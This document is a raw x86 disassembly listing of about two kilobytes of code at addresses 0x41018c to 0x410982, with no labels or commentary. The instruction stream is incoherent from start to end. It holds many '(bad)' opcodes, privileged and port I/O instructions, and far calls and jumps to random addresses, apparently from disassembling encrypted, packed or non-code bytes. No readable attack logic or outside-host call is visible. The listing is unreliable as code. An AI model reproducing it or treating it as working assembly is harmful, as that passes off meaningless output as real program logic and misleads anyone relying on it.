  41018c:	lods   al,BYTE PTR ds:[esi]
  41018d:	lods   ax,WORD PTR ds:[esi]
  41018f:	sbb    eax,0x1cd6a90c
  410194:	retf   0x2f4c
  410197:	nop
  410198:	test   eax,0x69491c53
  41019d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019e:	push   esp
  41019f:	xor    al,BYTE PTR [esi-0x6f1726b1]
  4101a5:	scas   al,BYTE PTR es:[edi]
  4101a6:	arpl   dx,cx
  4101a8:	add    DWORD PTR [ecx+0x18],eax
  4101ab:	or     DWORD PTR [edi+0x10660d55],ebp
  4101b1:	out    0xdb,eax
  4101b3:	sub    DWORD PTR [edx],esp
  4101b5:	mov    ebp,0x7a9fb742
  4101ba:	dec    esp
  4101bb:	or     BYTE PTR [ecx-0x31],0xde
  4101bf:	aaa    
  4101c0:	in     al,0x47
  4101c2:	add    edx,DWORD PTR [esi+0x3218a774]
  4101c8:	cwde   
  4101c9:	inc    ebx
  4101ca:	call   0x2f8cb763
  4101cf:	lock or al,0x84
  4101d2:	mov    BYTE PTR ds:0x37d2a114,bh
  4101d8:	fild   DWORD PTR [esi-0x3c8bac03]
  4101de:	sbb    DWORD PTR [ecx+0x1d],esi
  4101e1:	icebp  
  4101e2:	call   0x6ea8bcfc
  4101e7:	dec    edi
  4101e8:	pop    ecx
  4101e9:	and    dl,0x4b
  4101ec:	fistp  WORD PTR [ebx-0x542928b2]
  4101f2:	fst    DWORD PTR [ebp+0x525cde58]
  4101f8:	lock mov al,ds:0x4b8cde65
  4101fe:	adc    DWORD PTR [ecx+0x4a],ebx
  410201:	mov    esi,0xc45f8f36
  410206:	adc    eax,0x512cab39
  41020b:	pushf  
  41020c:	push   eax
  41020d:	pop    esi
  41020e:	mov    ecx,ebx
  410210:	out    dx,eax
  410211:	xlat   BYTE PTR ds:[ebx]
  410212:	and    BYTE PTR [edx+ebx*2-0x3408bbb4],dl
  410219:	push   edx
  41021a:	xor    al,0x3f
  41021c:	cld    
  41021d:	sbb    al,0xd
  41021f:	dec    ebx
  410220:	mov    esi,ebx
  410222:	lahf   
  410223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410224:	out    0xe,eax
  410226:	pop    ebx
  410227:	mov    eax,ds:0xd467bf9e
  41022c:	or     eax,0x49f96448
  410231:	test   DWORD PTR [edi+ebp*1+0x24b58053],edx
  410238:	inc    dh
  41023a:	lea    ecx,[edi-0x27e32818]
  410240:	mov    edi,0x41ad83c7
  410245:	inc    edi
  410246:	xchg   ecx,eax
  410247:	jecxz  0x410269
  410249:	push   0xb7cf0d28
  41024e:	or     DWORD PTR [edi],edi
  410250:	cld    
  410251:	and    eax,0xe32a5fad
  410256:	jmp    0x66464253
  41025b:	xchg   ebp,eax
  41025c:	push   esp
  41025d:	rcl    DWORD PTR [ecx+esi*4-0x130e6c2],1
  410264:	ror    BYTE PTR [edx+0x410bf9d7],1
  41026a:	(bad)  
  41026b:	aad    0xf1
  41026d:	jmp    0x2815:0xbb4c4e8b
  410274:	mov    fs,WORD PTR [edi+0x1a]
  410277:	in     al,0xc0
  410279:	cmp    BYTE PTR [edi],dl
  41027b:	mov    ds:0x6581f016,eax
  410280:	or     eax,0x4aa64cc1
  410285:	adc    BYTE PTR [eax+0x6d3f72d5],ch
  41028b:	(bad)  
  41028c:	push   0x260d10e3
  410291:	pop    ss
  410292:	bnd jb 0x4102d4
  410295:	pop    edi
  410296:	out    dx,eax
  410297:	imul   ebp,DWORD PTR [edi-0x7720ea28],0xdc93ac54
  4102a1:	xor    esi,DWORD PTR [ecx-0x5b]
  4102a4:	sbb    al,0x91
  4102a6:	ds xchg ecx,eax
  4102a8:	jp     0x410258
  4102aa:	pop    esi
  4102ab:	aas    
  4102ac:	inc    edx
  4102ad:	std    
  4102ae:	xor    al,0x3a
  4102b0:	pop    eax
  4102b1:	shr    BYTE PTR [ebx],1
  4102b3:	push   esi
  4102b4:	cs (bad) 
  4102b6:	retf   0xda95
  4102b9:	(bad)  
  4102ba:	pushfw 
  4102bc:	and    eax,0x1e370257
  4102c1:	push   eax
  4102c2:	stc    
  4102c3:	mov    ecx,0x789cc5ea
  4102c8:	leave  
  4102c9:	jbe    0x410282
  4102cb:	cmp    eax,0x25a08268
  4102d0:	popf   
  4102d1:	lock xchg esi,eax
  4102d3:	mov    ecx,0x2e7a4e43
  4102d8:	dec    esp
  4102d9:	push   ebp
  4102da:	or     DWORD PTR [esi],edi
  4102dc:	pop    edi
  4102dd:	inc    ebp
  4102de:	shr    DWORD PTR [bp+si-0x1b],0x0
  4102e3:	ins    DWORD PTR es:[edi],dx
  4102e4:	cmp    eax,0x66d1c78a
  4102e9:	mov    bl,0x64
  4102eb:	mov    ch,0x90
  4102ed:	lods   eax,DWORD PTR ds:[esi]
  4102ee:	jle    0x4102cd
  4102f0:	test   BYTE PTR [esi+edi*4+0x22],al
  4102f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f5:	pop    ebp
  4102f6:	ds xchg esi,eax
  4102f8:	jle    0x410342
  4102fa:	fmulp  st(3),st
  4102fc:	push   0xfc69e3b4
  410301:	push   eax
  410302:	(bad)  
  410303:	cmp    BYTE PTR [ecx-0x315517e9],bh
  410309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41030a:	adc    BYTE PTR [ecx],al
  41030c:	mov    bl,0xec
  41030e:	push   es
  41030f:	inc    esi
  410310:	mov    ds:0x12554d41,eax
  410315:	mov    esp,0x16b3c48c
  41031a:	dec    edx
  41031b:	cmp    cl,ch
  41031d:	cwde   
  41031e:	inc    ecx
  41031f:	(bad)  
  410322:	test   DWORD PTR [esi+0x39369064],edx
  410328:	push   0x456da7bd
  41032d:	in     eax,dx
  41032e:	dec    esi
  41032f:	jns    0x4102fb
  410331:	icebp  
  410332:	push   ecx
  410333:	das    
  410334:	int3   
  410335:	test   BYTE PTR [ebx],dh
  410337:	icebp  
  410338:	mov    esi,0x6c2216c3
  41033d:	stos   DWORD PTR es:[edi],eax
  41033e:	lods   eax,DWORD PTR ds:[esi]
  41033f:	or     eax,0xd42efc73
  410344:	fwait
  410345:	not    DWORD PTR [esi+ecx*4-0x6d4e953b]
  41034c:	fbstp  TBYTE PTR [ecx]
  41034e:	stos   BYTE PTR es:[edi],al
  41034f:	lods   eax,DWORD PTR ds:[esi]
  410350:	imul   edi,DWORD PTR [eax-0x23],0x9c82dae9
  410357:	ficom  DWORD PTR [edi-0x41]
  41035a:	push   ebp
  41035b:	pop    esi
  41035c:	add    eax,DWORD PTR [ecx]
  41035e:	jle    0x410350
  410360:	dec    esi
  410361:	xchg   ecx,eax
  410362:	cmp    al,0xf3
  410364:	sub    edi,DWORD PTR [edi-0x3d]
  410367:	and    DWORD PTR [esi+esi*1+0x2c],eax
  41036b:	(bad)  
  41036c:	jp     0x410363
  41036e:	ret    0x1104
  410371:	rcr    BYTE PTR [eax+0x1f],cl
  410374:	pop    ds
  410375:	mov    dl,0xbd
  410377:	(bad)  
  410378:	shr    DWORD PTR [edx+edx*2],1
  41037b:	jo     0x410315
  41037d:	xlat   BYTE PTR ds:[ebx]
  41037e:	clc    
  41037f:	sub    eax,0x44381294
  410384:	sub    DWORD PTR [eax-0x24b61ee2],0xad813088
  41038e:	xchg   ebp,eax
  41038f:	aam    0xe5
  410391:	fisttp DWORD PTR [edx]
  410393:	jae    0x410367
  410395:	clc    
  410396:	arpl   WORD PTR [eax],bp
  410398:	add    ebp,DWORD PTR [esi+0x7766ace0]
  41039e:	cli    
  41039f:	mov    al,ds:0xf06ca0a9
  4103a4:	ror    BYTE PTR [ebx],cl
  4103a6:	pop    esp
  4103a7:	aad    0xcf
  4103a9:	pop    edi
  4103aa:	fstp   st(0)
  4103ac:	lods   eax,DWORD PTR ds:[esi]
  4103ad:	adc    al,0x46
  4103af:	mov    al,0x49
  4103b1:	sub    al,0xa5
  4103b3:	mov    bl,0x80
  4103b5:	jl     0x410348
  4103b7:	in     eax,dx
  4103b8:	pop    edi
  4103b9:	inc    eax
  4103ba:	mov    es,WORD PTR [ebx]
  4103bc:	jecxz  0x4103ac
  4103be:	pop    ebp
  4103bf:	adc    dl,bl
  4103c1:	jb     0x410436
  4103c3:	dec    ebx
  4103c4:	xchg   ebx,eax
  4103c5:	test   al,0x7e
  4103c7:	xor    DWORD PTR [eax-0x2ca3376c],ebp
  4103cd:	cwde   
  4103ce:	and    eax,0xc0339c63
  4103d3:	pop    edi
  4103d4:	dec    esi
  4103d5:	xor    al,0x51
  4103d7:	pop    ecx
  4103d8:	popa   
  4103d9:	loop   0x4103ef
  4103db:	sub    ecx,0x53
  4103de:	mov    ds:0x1f1b48da,al
  4103e3:	or     eax,0x5329de85
  4103e8:	cld    
  4103e9:	aas    
  4103ea:	cli    
  4103eb:	xchg   ebx,eax
  4103ec:	adc    edi,eax
  4103ee:	jbe    0x4103ed
  4103f0:	ins    DWORD PTR es:[edi],dx
  4103f1:	hlt    
  4103f2:	sbb    eax,esp
  4103f4:	pop    esi
  4103f5:	lods   eax,DWORD PTR ds:[esi]
  4103f6:	inc    edi
  4103f7:	inc    eax
  4103f8:	femms  
  4103fa:	mov    bh,0x38
  4103fc:	dec    eax
  4103fd:	sbb    al,0xbb
  4103ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410400:	and    ah,BYTE PTR [edi+edi*1-0x6c6ba84e]
  410407:	add    bl,al
  410409:	or     BYTE PTR [eax+0x9412d73],al
  41040f:	repz dec ecx
  410411:	call   0xb71:0x9d150043
  410418:	xor    BYTE PTR ds:0x78005451,ch
  41041e:	jo     0x41048a
  410420:	test   DWORD PTR [ecx],eax
  410422:	int    0xea
  410424:	adc    eax,0xdaf151d8
  410429:	fwait
  41042a:	stos   BYTE PTR es:[edi],al
  41042b:	enter  0xddad,0xbe
  41042f:	cwde   
  410430:	xor    al,0x9c
  410432:	mov    ?,WORD PTR ds:[esi+0x36]
  410436:	out    dx,eax
  410437:	add    DWORD PTR [ebp-0x73],ecx
  41043a:	(bad)  
  41043b:	and    eax,0xd8ba5b63
  410440:	xor    bh,dl
  410442:	push   es
  410443:	enter  0xab3b,0x0
  410447:	out    dx,eax
  410448:	mov    bl,0xf0
  41044a:	or     DWORD PTR [edi+0x5aa75978],0x23
  410451:	pop    es
  410452:	inc    eax
  410453:	mov    ds:0x5f622193,al
  410458:	sbb    bl,BYTE PTR [edi+0x52]
  41045b:	xchg   edx,eax
  41045c:	xchg   ebp,eax
  41045d:	pop    edi
  41045e:	adc    eax,ebp
  410460:	pop    edi
  410461:	fdivrp st(5),st
  410463:	xor    al,0x1
  410465:	icebp  
  410466:	fild   QWORD PTR [eax-0x42dd33a3]
  41046c:	push   ss
  41046d:	call   0x1d11:0x45330251
  410474:	retf   0x85
  410477:	pop    ds
  410478:	inc    esi
  410479:	add    DWORD PTR [edx+0x5e8987bb],ebp
  41047f:	out    0xb1,al
  410481:	out    0x11,al
  410483:	add    DWORD PTR [esi],0x36600557
  410489:	add    dl,BYTE PTR [eax+0x421602e7]
  41048f:	call   0xc92a:0x996cb88d
  410496:	out    0xc7,al
  410498:	fcomp  DWORD PTR [eax]
  41049a:	loop   0x41041c
  41049c:	xchg   BYTE PTR [esi-0x55dcc95a],dh
  4104a2:	jns    0x41051d
  4104a4:	aas    
  4104a5:	inc    esp
  4104a6:	pop    ebp
  4104a7:	mov    bh,0x21
  4104a9:	in     al,0xb7
  4104ab:	loope  0x41044c
  4104ad:	mov    dh,0xe6
  4104af:	shl    BYTE PTR [edx-0x36],1
  4104b2:	adc    eax,0xdff22277
  4104b7:	test   BYTE PTR [esi],0xa1
  4104ba:	mov    dh,0x2b
  4104bc:	stos   DWORD PTR es:[edi],eax
  4104bd:	lock inc eax
  4104bf:	mov    esi,0x3806230b
  4104c4:	scas   eax,DWORD PTR es:[edi]
  4104c5:	neg    BYTE PTR [esi+0x69]
  4104c8:	(bad)  
  4104ca:	jp     0x4104da
  4104cc:	xchg   edx,eax
  4104cd:	loopne 0x410467
  4104cf:	je     0x4104a3
  4104d1:	(bad)  
  4104d2:	mov    bh,0xff
  4104d4:	mov    esi,DWORD PTR [edx-0x61]
  4104d7:	repz add DWORD PTR [edx-0x626de9a5],esp
  4104de:	(bad)  
  4104df:	and    bh,BYTE PTR [esi+0x5327c7c2]
  4104e5:	mov    bh,0x0
  4104e7:	push   eax
  4104e8:	fwait
  4104e9:	(bad)  
  4104ea:	(bad)  
  4104eb:	fidiv  DWORD PTR [ebx]
  4104ed:	xor    bh,dl
  4104ef:	dec    edx
  4104f0:	sar    DWORD PTR [edx],0x5e
  4104f3:	rol    DWORD PTR [ebp+ebx*8-0x76f24e8e],1
  4104fa:	mov    dl,0x7
  4104fc:	or     esp,DWORD PTR [ecx]
  4104fe:	cli    
  4104ff:	push   edi
  410500:	aas    
  410501:	cmp    eax,0xd6fdd2f2
  410506:	adc    ebp,0x7711007a
  41050c:	repnz repnz inc ecx
  41050f:	out    0x92,al
  410511:	lock popf 
  410513:	sar    BYTE PTR [ebx+ebp*1],0xe4
  410517:	shr    BYTE PTR [ebx+eax*2+0x7f03129c],cl
  41051e:	lods   eax,DWORD PTR ds:[esi]
  41051f:	sbb    eax,0xec58ad0d
  410524:	cwde   
  410525:	sbb    bl,BYTE PTR [esi]
  410527:	xchg   ebp,eax
  410528:	sbb    cl,BYTE PTR [ecx+0x75]
  41052b:	push   eax
  41052c:	shl    bh,1
  41052e:	js     0x410591
  410530:	scas   eax,DWORD PTR es:[edi]
  410531:	in     al,dx
  410532:	lock ffreep st(2)
  410535:	sbb    al,0x35
  410537:	aaa    
  410538:	cmp    edx,ebx
  41053a:	jno    0x410547
  41053c:	pusha  
  41053d:	add    DWORD PTR [edx+0x63],esp
  410540:	xor    DWORD PTR [edi],0xffffffc1
  410543:	dec    ebx
  410544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410545:	cld    
  410546:	mov    ebp,0x98c89ee5
  41054b:	ror    DWORD PTR [ebx],1
  41054d:	adc    cl,BYTE PTR [edx+eax*8]
  410550:	or     al,BYTE PTR ds:0xc9cbfcfa
  410556:	mov    esi,0xe59cbddf
  41055b:	mov    al,ds:0x8a59bde4
  410560:	mov    WORD PTR [ecx],ds
  410562:	add    DWORD PTR [ecx],ebx
  410564:	(bad)  
  410565:	dec    ebp
  410566:	push   ds
  410567:	sub    BYTE PTR [ebx+0x67],dl
  41056a:	mov    ch,dl
  41056c:	push   0x252b1cf5
  410571:	dec    esi
  410572:	sub    DWORD PTR [edx],ecx
  410574:	push   es
  410575:	in     al,dx
  410576:	push   ecx
  410577:	mov    eax,ds:0x49c9ddf2
  41057c:	into   
  41057d:	jl     0x41056d
  41057f:	cmp    edi,DWORD PTR [edx]
  410581:	xchg   esi,eax
  410582:	pop    edx
  410583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410584:	test   BYTE PTR [ecx],dh
  410586:	sbb    bh,BYTE PTR [ecx+0x4ada4976]
  41058c:	jl     0x41054d
  41058e:	retf   0xb2e4
  410591:	mov    ds:0x474ddc52,al
  410596:	aam    0xda
  410598:	push   cs
  410599:	test   eax,0x91550a75
  41059e:	jl     0x41061a
  4105a0:	xchg   cl,dh
  4105a2:	in     al,dx
  4105a3:	jnp    0x410552
  4105a5:	in     al,dx
  4105a6:	jle    0x410579
  4105a8:	mov    ds:0xcbbce2a7,eax
  4105ad:	jnp    0x41060e
  4105af:	mov    esi,0x3c4a23fa
  4105b4:	aad    0x80
  4105b6:	imul   esp,DWORD PTR [edx+0x71],0xb32fd20c
  4105bd:	data16 es mov al,0x55
  4105c1:	hlt    
  4105c2:	inc    ebx
  4105c3:	pop    es
  4105c4:	sbb    eax,0x12e80beb
  4105c9:	mov    dh,0xf7
  4105cb:	mov    ?,WORD PTR [edx+0x10]
  4105ce:	clc    
  4105cf:	mov    ecx,0x6629f7f
  4105d4:	inc    edi
  4105d5:	pop    edx
  4105d6:	test   eax,0x10bef378
  4105db:	push   ecx
  4105dc:	inc    edx
  4105dd:	std    
  4105de:	fwait
  4105df:	outs   dx,DWORD PTR ds:[esi]
  4105e0:	sti    
  4105e1:	aad    0xa4
  4105e3:	ret    
  4105e4:	jbe    0x410650
  4105e6:	add    al,0x89
  4105e8:	inc    ebx
  4105e9:	cmp    BYTE PTR [eax-0xa1720d6],dh
  4105ef:	clc    
  4105f0:	lods   eax,DWORD PTR ds:[esi]
  4105f1:	dec    ecx
  4105f2:	xlat   BYTE PTR ds:[ebx]
  4105f3:	les    esp,FWORD PTR [ebx-0x1a]
  4105f6:	(bad)  
  4105f8:	out    dx,al
  4105f9:	outs   dx,BYTE PTR ds:[esi]
  4105fa:	fstp   QWORD PTR ds:0x8a94c67a
  410600:	sbb    DWORD PTR [ecx+0x35],ebx
  410603:	and    al,0xbd
  410605:	or     ecx,ebx
  410607:	push   0x58104bd2
  41060c:	aas    
  41060d:	inc    ecx
  41060e:	inc    eax
  41060f:	jmp    0x4eeb31b8
  410614:	cmc    
  410615:	inc    ebp
  410616:	adc    BYTE PTR [esi+esi*4-0xa],ch
  41061a:	int3   
  41061b:	xchg   esi,eax
  41061c:	xchg   DWORD PTR [edx-0x8118794],ebx
  410622:	repz mov cl,0xe
  410625:	dec    edx
  410626:	adc    eax,DWORD PTR [eax+esi*2]
  410629:	or     bl,ah
  41062b:	and    ebp,DWORD PTR [ecx]
  41062d:	fstp   QWORD PTR [ebx]
  41062f:	enter  0x2d82,0x70
  410633:	dec    edx
  410634:	sub    eax,0xe0aedfa5
  410639:	pop    ecx
  41063a:	iret   
  41063b:	push   0x5e3d785b
  410640:	cmp    al,0xac
  410642:	sbb    al,0x3d
  410644:	xchg   ebp,eax
  410645:	scas   eax,DWORD PTR es:[edi]
  410646:	sbb    al,0xa8
  410648:	dec    ecx
  410649:	dec    ebx
  41064a:	mov    cs,esp
  41064c:	sub    BYTE PTR [ecx+0x1e],dl
  41064f:	mov    bh,0x42
  410651:	jo     0x410611
  410653:	sub    al,0xf3
  410655:	mov    eax,ds:0x5b794203
  41065a:	sub    eax,0x4651e4d0
  41065f:	outs   dx,BYTE PTR ds:[esi]
  410660:	in     eax,0x13
  410662:	sar    BYTE PTR [ebp-0x3206a43c],cl
  410668:	mov    eax,ds:0x1b5e948f
  41066d:	mov    ebx,ecx
  41066f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410671:	xchg   edx,eax
  410672:	adc    DWORD PTR [edi+0x5250b430],eax
  410678:	mov    edi,DWORD PTR [ecx+0x4d]
  41067b:	mov    dh,0x29
  41067d:	xchg   edx,eax
  41067e:	stc    
  41067f:	ins    DWORD PTR es:[edi],dx
  410680:	(bad)  
  410681:	pusha  
  410682:	push   ebx
  410683:	leave  
  410684:	imul   edx,DWORD PTR [esi+0x60794462],0xb0476c8c
  41068e:	out    0x8f,al
  410690:	cld    
  410691:	ss and al,0xf7
  410694:	xchg   esp,eax
  410695:	js     0x4106b5
  410697:	test   DWORD PTR ds:0x96a33251,ebp
  41069d:	retf   0x9f37
  4106a0:	shr    bl,0x32
  4106a3:	adc    esp,DWORD PTR [eax+0x20]
  4106a6:	jne    0x41062b
  4106a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a9:	xchg   BYTE PTR [edx],ch
  4106ab:	test   esp,esp
  4106ad:	jecxz  0x410673
  4106af:	ret    0x2f5c
  4106b2:	sub    eax,0xd8349b11
  4106b7:	pop    esi
  4106b8:	cdq    
  4106b9:	imul   esp,DWORD PTR [ebx],0x26e180dd
  4106bf:	inc    ebx
  4106c0:	xchg   ebx,eax
  4106c1:	pop    es
  4106c2:	fs xchg esi,eax
  4106c4:	push   eax
  4106c5:	sub    DWORD PTR [ebp-0x41],eax
  4106c8:	push   0xf5a2d3fa
  4106cd:	mov    ebp,0x53bf61f3
  4106d2:	bound  eax,QWORD PTR [esi]
  4106d4:	adc    DWORD PTR [edx],eax
  4106d6:	push   0x5d
  4106d8:	inc    ecx
  4106d9:	out    dx,al
  4106da:	cli    
  4106db:	dec    edx
  4106dc:	pop    esp
  4106dd:	sbb    ebp,esp
  4106df:	vmwrite esp,edi
  4106e2:	jns    0x4106f1
  4106e4:	cs push ecx
  4106e7:	das    
  4106e8:	andnps xmm7,XMMWORD PTR [ebp+edx*8+0x7effb1a0]
  4106f0:	aam    0xf
  4106f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106f3:	mov    ebx,0x5439aa88
  4106f8:	adc    ebx,DWORD PTR [eax+0x699da828]
  4106fe:	lods   eax,DWORD PTR ds:[esi]
  4106ff:	pop    esp
  410700:	push   edx
  410701:	xchg   esi,eax
  410702:	enter  0x7690,0xe7
  410706:	in     eax,dx
  410707:	push   edi
  410708:	inc    edi
  410709:	push   eax
  41070a:	jmp    0x410784
  41070c:	jmp    eax
  41070e:	jmp    0x41069f
  410710:	mov    al,ds:0x1b0c7eca
  410715:	mov    bl,0xc
  410717:	xor    BYTE PTR [ebx-0x16c48668],dl
  41071d:	lods   al,BYTE PTR ds:[esi]
  41071e:	out    0x9f,eax
  410720:	ffreep st(7)
  410722:	mov    esi,0x8f646cfa
  410727:	sub    edi,edx
  410729:	mov    eax,ds:0xb18d90d5
  41072e:	aam    0x84
  410730:	in     eax,0xae
  410732:	jmp    0x41079f
  410734:	push   esi
  410735:	call   0xadd48928
  41073a:	adc    eax,0x77aae64e
  41073f:	ret    0xe5e6
  410742:	scas   eax,DWORD PTR es:[edi]
  410743:	std    
  410744:	fdiv   QWORD PTR ds:0x14236134
  41074a:	daa    
  41074b:	ins    DWORD PTR es:[edi],dx
  41074c:	push   ebp
  41074d:	sub    al,0x5b
  41074f:	inc    esp
  410750:	mov    bl,al
  410752:	fdivr  QWORD PTR [esi]
  410754:	clc    
  410755:	out    dx,eax
  410756:	mov    bl,0x8a
  410758:	test   al,0xfe
  41075a:	mov    DWORD PTR [esi],0xe656836f
  410760:	repz cmp BYTE PTR [edx-0x1311ac2c],dh
  410767:	xor    eax,0xd3bc4b10
  41076c:	sbb    eax,0x60c012e2
  410771:	dec    ecx
  410772:	cdq    
  410773:	rol    BYTE PTR [ecx+esi*8+0x1e97d22],0x56
  41077b:	dec    ebp
  41077c:	popa   
  41077d:	or     eax,0xe15a571
  410782:	in     eax,0xf0
  410784:	pop    ss
  410785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410786:	das    
  410787:	div    DWORD PTR [ecx-0x681ad0f4]
  41078d:	adc    al,0xe6
  41078f:	cmp    edi,eax
  410791:	xor    esp,DWORD PTR [eax-0x48]
  410794:	stc    
  410795:	xor    cl,BYTE PTR [eax]
  410797:	ror    BYTE PTR ds:0xa782f402,1
  41079d:	pushf  
  41079e:	dec    ecx
  41079f:	mov    dh,0xa8
  4107a1:	push   es
  4107a2:	cmp    ch,BYTE PTR [ebp+0x42]
  4107a5:	in     al,0xe5
  4107a7:	add    bh,BYTE PTR [esp+ebp*4-0x19ffa623]
  4107ae:	mov    bh,0xb2
  4107b0:	xor    eax,0xd9439c4e
  4107b5:	daa    
  4107b6:	pop    DWORD PTR [ebx-0x41645aca]
  4107bc:	or     DWORD PTR [ebx+0x54],esp
  4107bf:	push   cs
  4107c0:	xor    BYTE PTR [edx+0x78],0x6d
  4107c4:	cmp    dl,ch
  4107c6:	aaa    
  4107c7:	xor    al,BYTE PTR [ecx]
  4107c9:	push   eax
  4107ca:	add    BYTE PTR [edi+0x4c263dfb],0x2b
  4107d1:	xchg   edi,eax
  4107d2:	test   DWORD PTR [eax+0x494bde2d],eax
  4107d8:	dec    eax
  4107d9:	push   esp
  4107da:	cli    
  4107db:	into   
  4107dc:	int3   
  4107dd:	sbb    ah,BYTE PTR ds:0xadf648c1
  4107e3:	add    DWORD PTR [eax],edx
  4107e5:	pop    ebx
  4107e6:	pop    esi
  4107e7:	pop    esp
  4107e8:	dec    ebp
  4107e9:	scas   al,BYTE PTR es:[edi]
  4107ea:	mov    ebx,0xcf631d27
  4107ef:	or     ebx,DWORD PTR [ebp+0x1a]
  4107f2:	jg     0x41078c
  4107f4:	mov    ah,0xab
  4107f6:	mov    esi,0x722e63aa
  4107fb:	in     al,0x57
  4107fd:	ficomp DWORD PTR [edx+0x5d3b3aab]
  410803:	pushf  
  410804:	cmp    eax,0x17357853
  410809:	dec    esp
  41080a:	inc    ebp
  41080b:	jmp    0x3938622c
  410810:	sbb    DWORD PTR [esi+ebx*4],eax
  410813:	mov    ch,0x1a
  410815:	mov    DWORD PTR [ebx],esp
  410817:	mov    WORD PTR [edx-0x42],fs
  41081a:	push   ebx
  41081b:	rcr    BYTE PTR [edi-0x1441cf11],1
  410821:	mov    cl,0xdf
  410823:	nop
  410824:	sbb    eax,0x510e4a52
  410829:	(bad)  
  41082a:	dec    DWORD PTR [esp+ebp*4]
  41082d:	dec    eax
  41082e:	test   eax,0x7e62b39e
  410833:	add    cl,BYTE PTR [ecx+0x1c4c8582]
  410839:	repz mov dh,0x3d
  41083c:	cmp    ah,ch
  41083e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41083f:	xchg   esp,eax
  410840:	(bad)  
  410841:	pop    esi
  410842:	pop    edi
  410843:	fst    QWORD PTR [eax+0x50]
  410846:	loope  0x410831
  410848:	sbb    al,0x6a
  41084a:	enter  0x77ba,0x2c
  41084e:	in     al,0x56
  410850:	cmp    BYTE PTR [edx],0x69
  410853:	fld    TBYTE PTR [edx]
  410855:	in     al,dx
  410856:	das    
  410857:	mov    cl,0x10
  410859:	retf   0x7344
  41085c:	mov    edx,0x3a277761
  410861:	shl    BYTE PTR [edi],0x38
  410864:	fld    TBYTE PTR [ebp+0x2adbceb4]
  41086a:	out    dx,al
  41086b:	xchg   esi,eax
  41086c:	mov    eax,0x67767ed4
  410871:	retf   0xb4e6
  410874:	mov    cs,WORD PTR [edi-0x71]
  410877:	icebp  
  410878:	rcr    DWORD PTR [ecx],1
  41087a:	fidivr DWORD PTR [eax]
  41087c:	cmp    bh,0xfc
  41087f:	mov    ds:0xc4ac30c1,eax
  410884:	cmp    eax,0xd455f06a
  410889:	jns    0x4108e8
  41088b:	hlt    
  41088c:	ror    DWORD PTR [edi+0x6406e00a],0x8f
  410893:	mov    dl,BYTE PTR [edx-0x2ab708e9]
  410899:	and    BYTE PTR [ecx],ah
  41089b:	aad    0xba
  41089d:	std    
  41089e:	sub    al,0x79
  4108a0:	repz or ah,BYTE PTR [ebx-0x2aa00874]
  4108a7:	jle    0x410870
  4108a9:	jmp    0x21cf:0xb3a9a3f9
  4108b0:	aaa    
  4108b1:	mov    eax,ecx
  4108b3:	mov    ebx,0x7359165a
  4108b8:	lods   eax,DWORD PTR ds:[esi]
  4108b9:	mov    BYTE PTR [ecx],0xa0
  4108bc:	(bad)  
  4108bd:	pop    eax
  4108be:	jnp    0x4108ad
  4108c0:	pop    ebp
  4108c1:	push   eax
  4108c2:	loope  0x410937
  4108c4:	dec    edi
  4108c5:	sahf   
  4108c6:	iret   
  4108c7:	inc    esp
  4108c8:	out    dx,eax
  4108c9:	xchg   ebp,eax
  4108cb:	iret   
  4108cc:	xchg   edx,eax
  4108cd:	dec    edi
  4108ce:	loopne 0x4108d3
  4108d0:	sar    ecx,cl
  4108d2:	xchg   DWORD PTR [edx-0x7f279a20],esi
  4108d8:	sbb    BYTE PTR [ecx-0x7a],al
  4108db:	sti    
  4108dc:	cmp    esi,DWORD PTR [ecx+0xc]
  4108df:	retf   
  4108e0:	push   edx
  4108e1:	push   eax
  4108e2:	mov    edx,0x7e6e0aa3
  4108e7:	xor    ebp,DWORD PTR [esi-0x4c942c61]
  4108ed:	sbb    al,0x97
  4108ef:	or     DWORD PTR [ebx+0x7a181257],0x1d
  4108f6:	shl    DWORD PTR [edi],1
  4108f8:	mov    ebx,0x74e03c0b
  4108fd:	mov    esi,0xdd88fadb
  410902:	cmp    bl,BYTE PTR [ebx-0x31]
  410905:	or     edi,DWORD PTR [esi+esi*8]
  410908:	mov    ah,0xb7
  41090a:	pop    esi
  41090b:	inc    eax
  41090c:	cmp    eax,0x725cd844
  410911:	lds    edx,FWORD PTR [ebx+0x32e13c5c]
  410917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410918:	cmp    eax,0xedfabcff
  41091d:	fidiv  WORD PTR [esi+0x3b]
  410920:	(bad)  
  410922:	sub    eax,0x8ab8073d
  410927:	mov    WORD PTR [edx],ds
  410929:	inc    edi
  41092a:	je     0x410997
  41092c:	xchg   esp,eax
  41092d:	inc    ebp
  41092e:	jp     0x4108de
  410930:	(bad)  
  410931:	mov    eax,ds:0x290aa6f5
  410936:	push   ecx
  410937:	add    ecx,eax
  410939:	inc    ebx
  41093a:	ins    BYTE PTR es:[edi],dx
  41093b:	test   DWORD PTR [esi],0xa5c9b769
  410941:	rcr    DWORD PTR [edi-0x1c],cl
  410944:	pop    ebp
  410945:	push   0x2c
  410947:	retf   0x316
  41094a:	ds cwde 
  41094c:	out    0xf9,eax
  41094e:	mov    bl,BYTE PTR [eax+0x6352d07c]
  410954:	sahf   
  410955:	call   0xc626380e
  41095a:	ret    
  41095b:	hlt    
  41095c:	inc    esp
  41095d:	push   0x2a
  41095f:	stc    
  410960:	mov    ?,WORD PTR [edx]
  410962:	jno    0x41099d
  410964:	jecxz  0x410964
  410966:	push   ds
  410967:	test   ch,bl
  410969:	jns    0x41092d
  41096b:	dec    edx
  41096c:	loope  0x410985
  41096e:	jle    0x41092f
  410970:	mov    esi,0xc96ce125
  410975:	call   0x8b08:0x60b0f034
  41097c:	fcmovnu st,st(7)
  41097e:	int3   
  41097f:	adc    ah,BYTE PTR [ecx]
  410981:	inc    eax
  410982:	adc    BYTE PTR [edx-0x7b],bh
